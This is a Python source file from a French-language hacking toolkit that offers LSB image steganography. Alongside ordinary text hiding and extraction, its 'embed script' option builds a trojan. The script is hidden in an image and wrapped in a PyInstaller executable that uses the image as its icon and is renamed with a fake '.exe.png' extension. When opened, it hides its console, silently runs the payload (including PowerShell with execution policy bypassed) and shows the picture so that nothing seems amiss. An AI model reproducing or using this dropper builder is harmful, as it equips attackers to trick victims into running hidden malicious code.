# Copyright (c) Your.Tool (https://www.josh-studio.com)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Config import *
from Config.Util import *

Title("Steganography")

try:
    from PIL import Image
    import os
    import numpy as np
    from tkinter import filedialog, Tk
    import time
    import base64
    import zlib
    import sys
    import tempfile
    import subprocess
    
    def text_to_binary(text):
        """Convertit du texte en représentation binaire avec un délimiteur de fin"""
        binary = ''.join(format(ord(char), '08b') for char in text)
        # Ajouter le délimiteur EOF pour la détection de fin
        binary += '11111111' + '00000000' * 4  # Délimiteur plus distinct pour éviter les faux positifs
        return binary
    
    def binary_to_text(binary):
        """Convertit une représentation binaire en texte"""
        text = ''
        for i in range(0, len(binary), 8):
            if i + 8 <= len(binary):
                byte = binary[i:i+8]
                text += chr(int(byte, 2))
        return text

    def print_progress(iteration, total, prefix='', suffix='', length=50, fill='█'):
        """Affiche une barre de progression dans la console"""
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f"\r{prefix} |{bar}| {percent}% {suffix}", end='\r')
        if iteration == total: 
            print()

    def encode_image(image_path, text, output_path):
        """Cache du texte dans une image en utilisant la stéganographie LSB optimisée"""
        # Ouvrir l'image et conserver son format d'origine
        img = Image.open(image_path)
        img_format = img.format
        width, height = img.size
        
        # Convertir en RGB si nécessaire
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        # Convertir l'image en tableau numpy pour un traitement plus rapide
        img_array = np.array(img)
        
        # Convertir le texte en binaire avec délimiteur
        binary_text = text_to_binary(text)
        total_bits = len(binary_text)
        
        # Vérifier si l'image est assez grande
        max_bits = width * height * 3
        if total_bits > max_bits:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Texte trop long pour cette image ({total_bits} bits nécessaires, {max_bits} disponibles)")
            return False
        
        # Informations de progression
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Masquage de {len(text)} caractères ({total_bits} bits) dans l'image...")
        start_time = time.time()
        
        # Remodeler l'image pour un traitement séquentiel plus rapide
        reshaped = img_array.reshape(-1)
        
        # Nombre de pixels à modifier
        pixels_to_modify = min(total_bits, len(reshaped))
        
        # Iteration optimisée avec barre de progression
        binary_index = 0
        for i in range(pixels_to_modify):
            if binary_index < total_bits:
                # Modification du bit de poids faible
                reshaped[i] = (reshaped[i] & 254) | int(binary_text[binary_index])
                binary_index += 1
                
                # Afficher la progression toutes les 10000 itérations
                if i % 10000 == 0 or i == pixels_to_modify - 1:
                    print_progress(i + 1, pixels_to_modify, 
                                  prefix=f"{BEFORE + current_time_hour() + AFTER} {INFO} Progression:", 
                                  suffix=f'({i+1}/{pixels_to_modify})', length=30)
        
        # Remettre les données modifiées dans la forme originale
        img_array = reshaped.reshape(img_array.shape)
        
        # Créer une nouvelle image à partir du tableau modifié
        result_img = Image.fromarray(img_array)
        
        # Conserver le format d'origine si possible
        if img_format in ['PNG', 'BMP']:
            result_img.save(output_path, format=img_format)
        else:
            # Pour la compression JPEG, utiliser PNG pour éviter la perte des données cachées
            result_img.save(output_path, format='PNG')
        
        end_time = time.time()
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Masquage terminé en {end_time - start_time:.2f} secondes")
        return True
    
    def decode_image(image_path):
        """Extrait du texte caché d'une image"""
        # Ouvrir l'image
        img = Image.open(image_path)
        width, height = img.size
        
        # Convertir en RGB si nécessaire
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        # Convertir l'image en tableau numpy
        img_array = np.array(img)
        
        # Remodeler pour un traitement séquentiel
        reshaped = img_array.reshape(-1)
        total_pixels = len(reshaped)
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Analyse de l'image pour extraire le texte caché...")
        start_time = time.time()
        
        # Extraire les bits LSB
        binary_text = ''
        delimiter = '1111111100000000000000000000000000000000'  # Notre délimiteur spécifique
        found = False
        
        # Parcourir les pixels et extraire les bits
        for i in range(total_pixels):
            # Extraire le bit LSB
            binary_text += str(reshaped[i] & 1)
            
            # Vérifier si on a atteint le délimiteur
            if len(binary_text) >= 40 and binary_text[-40:] == delimiter:
                found = True
                # Supprimer le délimiteur
                binary_text = binary_text[:-40]
                break
                
            # Afficher la progression toutes les 100000 itérations
            if i % 100000 == 0 or i == total_pixels - 1:
                print_progress(i + 1, total_pixels, 
                              prefix=f"{BEFORE + current_time_hour() + AFTER} {INFO} Analyse:", 
                              suffix=f'({i+1}/{total_pixels})', length=30)
        
        if found:
            # Convertir le binaire en texte
            text = binary_to_text(binary_text)
            end_time = time.time()
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Extraction terminée en {end_time - start_time:.2f} secondes")
            return text
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Aucun délimiteur trouvé. Tentative d'extraction partielle...")
            
            # Essayer d'extraire quand même du texte (jusqu'à une certaine limite)
            max_chars = min(len(binary_text) // 8, 1000)  # Limite à 1000 caractères pour éviter un décodage trop long
            text = binary_to_text(binary_text[:max_chars*8])
                
            # Essayer de détecter une séquence qui ressemble à du texte cohérent
            import re
            valid_text_pattern = re.compile(r'[A-Za-z0-9\s.,;:!?-]{10,}')  # Recherche de texte cohérent
            matches = valid_text_pattern.findall(text)
            
            if matches:
                end_time = time.time()
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Extraction partielle terminée en {end_time - start_time:.2f} secondes")
                return max(matches, key=len)  # Retourner le texte cohérent le plus long
            
            return None
    
    def embed_script_in_image(script_path, image_path, output_path, auto_exec=True):
        """Cache un script exécutable dans une image"""
        try:
            # Lire le contenu du script
            with open(script_path, 'rb') as f:
                script_content = f.read()
            
            # Compresser et encoder le script en base64 pour réduire sa taille
            compressed_content = zlib.compress(script_content, 9)  # Niveau 9 = compression maximale
            encoded_content = base64.b64encode(compressed_content).decode('utf-8')
            
            # Ajouter un en-tête pour identifier que c'est un script
            file_extension = os.path.splitext(script_path)[1].lower()
            header = f"#SCRIPT#{file_extension}#"
            content_to_hide = header + encoded_content
            
            # Utiliser la fonction de stéganographie pour cacher le script
            success = encode_image(image_path, content_to_hide, output_path)
                
            # Si l'option auto_exec est activée, créer un fichier exécutable déguisé en image
            if success and auto_exec:
                if os_name == "Windows":
                    create_executable_image_windows(output_path, script_path)
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} L'auto-exécution n'est supportée que sous Windows actuellement")
                    create_autorun_launcher(output_path, script_path)
                
            return success
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors de l'intégration du script: {str(e)}")
            return False
    
    def create_executable_image_windows(image_path, script_path):
        """Crée un fichier .exe qui affiche l'image et exécute le script caché (Windows uniquement)"""
        try:
            # Obtenir les chemins
            output_dir = os.path.dirname(image_path)
            image_name = os.path.basename(image_path)
            exe_output = os.path.splitext(image_path)[0] + ".exe"
            
            # Créer un script Python qui sera converti en .exe
            temp_py_path = os.path.join(output_dir, f"temp_launcher_{int(time.time())}.py")
            
            # Code du lanceur qui sera compilé en exe
            launcher_code = f"""# Lanceur automatique créé par Your.Tool Steganography
import os
import sys
import base64
import zlib
import tempfile
import subprocess
import shutil
from PIL import Image
import numpy as np
import time
import ctypes

def hide_console():
    # Cacher la console sous Windows
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def decode_image(image_path):
    # Ouvrir l'image
    img = Image.open(image_path)
    
    # Convertir en RGB si nécessaire
    if img.mode != 'RGB':
        img = img.convert('RGB')
    
    # Convertir l'image en tableau numpy
    img_array = np.array(img)
    
    # Remodeler pour un traitement séquentiel
    reshaped = img_array.reshape(-1)
    total_pixels = len(reshaped)
    
    # Extraire les bits LSB
    binary_text = ''
    delimiter = '1111111100000000000000000000000000000000'  # Notre délimiteur
    found = False
    
    # Parcourir les pixels et extraire les bits
    for i in range(total_pixels):
        # Extraire le bit LSB
        binary_text += str(reshaped[i] & 1)
        
        # Vérifier si on a atteint le délimiteur
        if len(binary_text) >= 40 and binary_text[-40:] == delimiter:
            found = True
            # Supprimer le délimiteur
            binary_text = binary_text[:-40]
            break
    
    if not found:
        return None
    
    # Convertir le binaire en texte
    text = ''
    for i in range(0, len(binary_text), 8):
        if i + 8 <= len(binary_text):
            byte = binary_text[i:i+8]
            text += chr(int(byte, 2))
    
    return text

def extract_and_execute(image_path):
    # Extraire le contenu caché
    hidden_content = decode_image(image_path)
    
    if not hidden_content:
        return False
    
    # Vérifier si c'est un script
    if not hidden_content.startswith("#SCRIPT#"):
        return False
    
    # Extraire l'extension et le contenu
    parts = hidden_content.split("#", 3)
    if len(parts) < 4:
        return False
    
    extension = parts[2]
    encoded_content = parts[3]
    
    try:
        # Décoder et décompresser
        decoded_content = base64.b64decode(encoded_content)
        script_content = zlib.decompress(decoded_content)
        
        # Créer un fichier temporaire pour le script
        with tempfile.NamedTemporaryFile(suffix=extension, delete=False, mode='wb') as temp:
            temp_script_path = temp.name
            temp.write(script_content)
        
        # Exécuter le script en fonction de son extension
        if extension == '.py':
            # Exécuter le script Python en mode caché
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(['pythonw', temp_script_path], startupinfo=startupinfo)
        elif extension in ['.bat', '.cmd']:
            # Exécuter le batch en mode caché
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([temp_script_path], startupinfo=startupinfo)
        elif extension == '.ps1':
            # Exécuter PowerShell en mode caché
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', temp_script_path], startupinfo=startupinfo)
        elif extension == '.vbs':
            # Exécuter le VBScript en mode caché
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(['wscript', temp_script_path], startupinfo=startupinfo)
        elif extension == '.js':
            # Exécuter le JavaScript en mode caché
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(['wscript', temp_script_path], startupinfo=startupinfo)
        
        return True
    except:
        # En cas d'erreur, ne rien faire et juste afficher l'image
        return False

def show_image(image_path):
    # Afficher l'image pour que tout semble normal
    try:
        # Si possible, utiliser le visualiseur d'images par défaut
        os.startfile(image_path)
    except:
        # Fallback à PIL
        try:
            from PIL import ImageShow
            img = Image.open(image_path)
            ImageShow.show(img)
        except:
            pass

if __name__ == "__main__":
    # Cacher la console
    hide_console()
    
    # Chemin vers l'image incorporée
    current_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(current_dir, "{image_name}")
    
    # Extraire l'image si elle n'existe pas déjà
    if not os.path.exists(image_path):
        # L'image est stockée dans l'exécutable, nous devons l'extraire
        # Obtenir le chemin de l'exécutable
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        # Copier l'image depuis les ressources intégrées
        try:
            # Pour un .exe créé avec PyInstaller, l'image serait dans le dossier _internal
            resource_path = os.path.join(os.path.dirname(exe_path), "_internal", "{image_name}")
            if os.path.exists(resource_path):
                shutil.copy2(resource_path, image_path)
        except:
            pass
    
    # Exécuter le script caché et afficher l'image
    extract_and_execute(image_path)
    time.sleep(0.5)  # Attendre un peu pour que le script puisse démarrer
    show_image(image_path)
"""
            
            # Écrire le code du lanceur dans un fichier temporaire
            with open(temp_py_path, 'w', encoding='utf-8') as f:
                f.write(launcher_code)
            
            # Créer un .exe à partir du script Python
            try:
                # Utiliser PyInstaller pour créer un exécutable
                import PyInstaller.__main__
                
                # Construire la commande PyInstaller
                pyinstaller_args = [
                    '--onefile',
                    '--windowed',
                    '--noconsole',
                    '--icon', image_path,  # Utiliser l'image comme icône
                    '--add-data', f"{image_path};.",  # Inclure l'image comme ressource
                    '--name', os.path.splitext(os.path.basename(image_path))[0],
                    '--distpath', output_dir,
                    temp_py_path
                ]
                
                # Exécuter PyInstaller
                PyInstaller.__main__.run(pyinstaller_args)
                
                # Nettoyer les fichiers temporaires
                try:
                    os.remove(temp_py_path)
                    shutil.rmtree('build', ignore_errors=True)
                    if os.path.exists(os.path.splitext(temp_py_path)[0] + '.spec'):
                        os.remove(os.path.splitext(temp_py_path)[0] + '.spec')
                except:
                    pass
                
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Exécutable auto-lançable créé avec succès: {white}{exe_output}{red}")
                
                # Renommer l'exécutable pour qu'il ressemble à une image
                try:
                    # Ajouter une fausse extension .png ou .jpg après .exe
                    fake_image = exe_output + ".png"
                    if os.path.exists(exe_output):
                        os.rename(exe_output, fake_image)
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fichier camouflé en image: {white}{fake_image}{red}")
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Double-cliquez sur ce fichier pour exécuter le script caché")
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Impossible de camoufler l'exécutable: {str(e)}")
                
                return True
            except ImportError:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} PyInstaller n'est pas installé. Installation en cours...")
                
                # Essayer d'installer PyInstaller
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} PyInstaller a été installé. Veuillez réessayer.")
                except:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Impossible d'installer PyInstaller automatiquement.")
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Utilisation de la méthode alternative...")
                    create_autorun_launcher(image_path, script_path)
                
                # Nettoyer
                try:
                    os.remove(temp_py_path)
                except:
                    pass
            
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors de la création de l'exécutable: {str(e)}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Utilisation de la méthode alternative...")
            create_autorun_launcher(image_path, script_path)
            return False

    def create_autorun_launcher(image_path, script_path):
        """Crée un lanceur qui exécute automatiquement le script caché dans l'image"""
        try:
            # Déterminer le nom du lanceur (.pyw pour exécution sans console)
            launcher_path = os.path.splitext(image_path)[0] + "_autorun.pyw"
            script_ext = os.path.splitext(script_path)[1].lower()
            
            # Créer le contenu du lanceur
            launcher_code = f"""# Lanceur automatique créé par Your.Tool Steganography
# Ce script extrait et exécute le script caché dans l'image

import os
import sys
import base64
import zlib
import tempfile
import subprocess
from PIL import Image
import numpy as np
import time

def decode_image(image_path):
    # Ouvrir l'image
    img = Image.open(image_path)
    
    # Convertir en RGB si nécessaire
    if img.mode != 'RGB':
        img = img.convert('RGB')
    
    # Convertir l'image en tableau numpy
    img_array = np.array(img)
    
    # Remodeler pour un traitement séquentiel
    reshaped = img_array.reshape(-1)
    total_pixels = len(reshaped)
    
    # Extraire les bits LSB
    binary_text = ''
    delimiter = '1111111100000000000000000000000000000000'  # Notre délimiteur
    found = False
    
    # Parcourir les pixels et extraire les bits
    for i in range(total_pixels):
        # Extraire le bit LSB
        binary_text += str(reshaped[i] & 1)
        
        # Vérifier si on a atteint le délimiteur
        if len(binary_text) >= 40 and binary_text[-40:] == delimiter:
            found = True
            # Supprimer le délimiteur
            binary_text = binary_text[:-40]
            break
    
    if not found:
        return None
    
    # Convertir le binaire en texte
    text = ''
    for i in range(0, len(binary_text), 8):
        if i + 8 <= len(binary_text):
            byte = binary_text[i:i+8]
            text += chr(int(byte, 2))
    
    return text

def extract_and_execute():
    # Chemin de l'image (basé sur le nom du lanceur)
    image_path = "{image_path}"
    
    # Vérifier que l'image existe
    if not os.path.exists(image_path):
        return False
    
    # Extraire le contenu caché
    hidden_content = decode_image(image_path)
    
    if not hidden_content:
        return False
    
    # Vérifier si c'est un script
    if not hidden_content.startswith("#SCRIPT#"):
        return False
    
    # Extraire l'extension et le contenu
    parts = hidden_content.split("#", 3)
    if len(parts) < 4:
        return False
    
    extension = parts[2]
    encoded_content = parts[3]
    
    try:
        # Décoder et décompresser
        decoded_content = base64.b64decode(encoded_content)
        script_content = zlib.decompress(decoded_content)
        
        # Créer un fichier temporaire pour le script
        with tempfile.NamedTemporaryFile(suffix=extension, delete=False, mode='wb') as temp:
            temp_script_path = temp.name
            temp.write(script_content)
        
        # Exécuter le script en fonction de son extension
        if extension == '.py':
            if sys.platform.startswith('win'):
                cmd = ['pythonw', temp_script_path]
                # Masquer la fenêtre de console
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                subprocess.Popen(cmd, startupinfo=startupinfo)
            else:
                cmd = ['python3', temp_script_path]
                subprocess.Popen(cmd)
        elif extension in ['.bat', '.cmd'] and sys.platform.startswith('win'):
            # Cacher la fenêtre de console
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([temp_script_path], startupinfo=startupinfo)
        elif extension == '.ps1' and sys.platform.startswith('win'):
            # Cacher la fenêtre de console
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', temp_script_path], startupinfo=startupinfo)
        elif extension == '.sh' and not sys.platform.startswith('win'):
            os.chmod(temp_script_path, 0o755)
            subprocess.Popen([temp_script_path])
        
        return True
    except:
        # En cas d'erreur, ne rien faire et juste afficher l'image
        return False

# Ouvrir l'image pour masquer l'extraction du script
try:
    # Exécuter le script caché
    extract_and_execute()
    
    # Attendre un peu pour que le script puisse démarrer
    time.sleep(0.5)
    
    # Afficher l'image (pour que ça semble normal)
    from PIL import ImageShow
    img = Image.open("{image_path}")
    ImageShow.show(img)
except:
    # Si l'ouverture avec PIL échoue, utiliser une méthode alternative
    if sys.platform.startswith('win'):
        os.startfile("{image_path}")
    elif sys.platform.startswith('darwin'):  # macOS
        subprocess.call(['open', "{image_path}"])
    else:  # Linux
        subprocess.call(['xdg-open', "{image_path}"])
"""
            
            # Écrire le code du lanceur dans un fichier
            with open(launcher_path, 'w', encoding='utf-8') as f:
                f.write(launcher_code)
                
            # Rendre le lanceur exécutable sur les systèmes Unix
            if os_name != "Windows":
                os.chmod(launcher_path, 0o755)
                
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Lanceur auto-exécutable créé: {white}{launcher_path}{red}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Pour exécuter automatiquement le script, lancez ce fichier .pyw")
            return True
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors de la création du lanceur: {str(e)}")
            return False

    def extract_script_from_image(image_path, output_dir):
        """Extrait un script caché d'une image"""
        try:
            # Extraire le contenu caché
            hidden_content = decode_image(image_path)
            
            if not hidden_content:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucun contenu caché trouvé dans l'image")
                return False
            
            # Vérifier si c'est un script (commence par #SCRIPT#)
            if not hidden_content.startswith("#SCRIPT#"):
                print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Le contenu caché n'est pas un script")
                return False
            
            # Extraire l'extension et le contenu
            parts = hidden_content.split("#", 3)
            if len(parts) < 4:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Format de script invalide")
                return False
            
            extension = parts[2]
            encoded_content = parts[3]
            
            # Décoder et décompresser
            try:
                decoded_content = base64.b64decode(encoded_content)
                script_content = zlib.decompress(decoded_content)
                
                # Créer un nom de fichier unique
                timestamp = int(time.time())
                output_file = os.path.join(output_dir, f"extracted_script_{timestamp}{extension}")
                
                # Sauvegarder le script
                with open(output_file, 'wb') as f:
                    f.write(script_content)
                
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Script extrait et sauvegardé dans: {white}{output_file}{red}")
                return output_file
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors du décodage du script: {str(e)}")
                return False
                
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors de l'extraction du script: {str(e)}")
            return False
    
    root = Tk()
    root.withdraw()
    
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Stéganographie - Cacher des messages ou scripts dans des images")
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Choisissez une opération:")
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} 1. Masquer du texte dans une image")
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} 2. Extraire du texte d'une image")
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} 3. Intégrer un script dans une image")
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} 4. Extraire un script d'une image")
    
    choice = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Votre choix (1/2/3/4) -> {reset}")
    
    if choice == '1':
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Sélectionnez une image (PNG recommandé pour de meilleurs résultats)")
        image_path = filedialog.askopenfilename(filetypes=[
            ("Images recommandées", "*.png;*.bmp"), 
            ("Toutes les images", "*.png;*.jpg;*.jpeg;*.bmp;*.gif")
        ])
        
        if not image_path:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucune image sélectionnée")
            Continue()
            Reset()

        # Option pour charger le texte depuis un fichier ou le saisir directement
        load_method = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Charger le texte depuis un fichier? (o/n) -> {reset}")
        
        if load_method.lower() in ['o', 'oui', 'y', 'yes']:
            text_file = filedialog.askopenfilename(filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")])
            if not text_file:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucun fichier texte sélectionné")
                Continue()
                Reset()
            
            try:
                with open(text_file, 'r', encoding='utf-8') as f:
                    text = f.read()
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Texte chargé: {len(text)} caractères")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors de la lecture du fichier: {str(e)}")
                Continue()
                Reset()
        else:
            text = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Entrez le texte à masquer -> {reset}")
        
        output_dir = os.path.join(tool_path, "1-Output", "Steganography")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        output_path = os.path.join(output_dir, f"steg_{os.path.basename(image_path)}")
        
        if encode_image(image_path, text, output_path):
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Texte masqué avec succès!")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Image sauvegardée: {white}{output_path}{red}")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Échec du masquage du texte")
    
    elif choice == '2':
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Sélectionnez une image contenant un message caché")
        image_path = filedialog.askopenfilename(filetypes=[
            ("Toutes les images", "*.png;*.jpg;*.jpeg;*.bmp;*.gif"),
            ("Images PNG", "*.png"),
            ("Images BMP", "*.bmp"),
            ("Images JPEG", "*.jpg;*.jpeg")
        ])
        
        if not image_path:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucune image sélectionnée")
            Continue()
            Reset()

        text = decode_image(image_path)
        
        if text:
            # Si c'est un script (commence par #SCRIPT#), ne pas l'afficher directement
            if text.startswith("#SCRIPT#"):
                print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Cette image contient un script intégré, utilisez l'option 4 pour l'extraire")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Texte caché trouvé :")
                print(f"{white}{text}{red}")
            
            # Option pour sauvegarder le texte extrait dans un fichier
            save_option = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Sauvegarder le texte extrait dans un fichier? (o/n) -> {reset}")
            
            if save_option.lower() in ['o', 'oui', 'y', 'yes']:
                output_dir = os.path.join(tool_path, "1-Output", "Steganography")
                if not os.path.exists(output_dir):
                    os.makedirs(output_dir)
                
                output_file = os.path.join(output_dir, f"extracted_text_{os.path.basename(image_path)}.txt")
                
                try:
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(text)
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Texte sauvegardé dans: {white}{output_file}{red}")
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur lors de l'enregistrement du fichier: {str(e)}")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucun texte caché trouvé ou format d'image non supporté")
    
    elif choice == '3':
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Sélectionnez le script à intégrer dans l'image")
        script_path = filedialog.askopenfilename(filetypes=[
            ("Scripts Python", "*.py"),
            ("Scripts Batch", "*.bat;*.cmd"),
            ("Scripts PowerShell", "*.ps1"),
            ("Scripts Shell", "*.sh"),
            ("Scripts JavaScript", "*.js"),
            ("Scripts VBScript", "*.vbs"),
            ("Tous les fichiers", "*.*")
        ])
        
        if not script_path:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucun script sélectionné")
            Continue()
            Reset()
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Sélectionnez l'image dans laquelle intégrer le script (PNG recommandé)")
        image_path = filedialog.askopenfilename(filetypes=[
            ("Images recommandées", "*.png;*.bmp"), 
            ("Toutes les images", "*.png;*.jpg;*.jpeg;*.bmp;*.gif")
        ])
        
        if not image_path:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucune image sélectionnée")
            Continue()
            Reset()
        
        output_dir = os.path.join(tool_path, "1-Output", "Steganography")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        script_name = os.path.basename(script_path)
        output_path = os.path.join(output_dir, f"script_{os.path.basename(image_path)}")
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} AVERTISSEMENT: Cette fonctionnalité crée une image avec un script auto-exécutable!")
        print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Utilisez ceci uniquement pour des tests de sécurité légitimes.")
        
        auto_exec = True  # Toujours créer un fichier auto-exécutable
        
        if embed_script_in_image(script_path, image_path, output_path, auto_exec):
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Script '{script_name}' intégré avec succès!")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Image sauvegardée: {white}{output_path}{red}")
            if auto_exec:
                if os_name == "Windows":
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Un exécutable camouflé en image a été créé")
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Double-cliquez sur l'image pour exécuter le script caché")
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Un lanceur auto-exécutable a été créé à côté de l'image")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Échec de l'intégration du script")
    
    elif choice == '4':
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Sélectionnez une image contenant un script caché")
        image_path = filedialog.askopenfilename(filetypes=[
            ("Toutes les images", "*.png;*.jpg;*.jpeg;*.bmp;*.gif"),
            ("Images PNG", "*.png"),
            ("Images BMP", "*.bmp")
        ])
        
        if not image_path:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucune image sélectionnée")
            Continue()
            Reset()
        
        output_dir = os.path.join(tool_path, "1-Output", "Steganography")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} AVERTISSEMENT: Extraire et exécuter un script inconnu peut être dangereux.")
        print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Assurez-vous de vérifier le contenu du script avant de l'exécuter.")
        
        extracted_file = extract_script_from_image(image_path, output_dir)
        if extracted_file:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Script extrait avec succès: {white}{extracted_file}{red}")
            print(f"{BEFORE + current_time_hour() + AFTER} {WARNING} Vérifiez toujours le contenu du script avant de l'exécuter!")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Aucun script trouvé dans l'image ou extraction échouée")
    
    else:
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Choix invalide")
    
    Continue()
    Reset()
except Exception as e:
    Error(e)

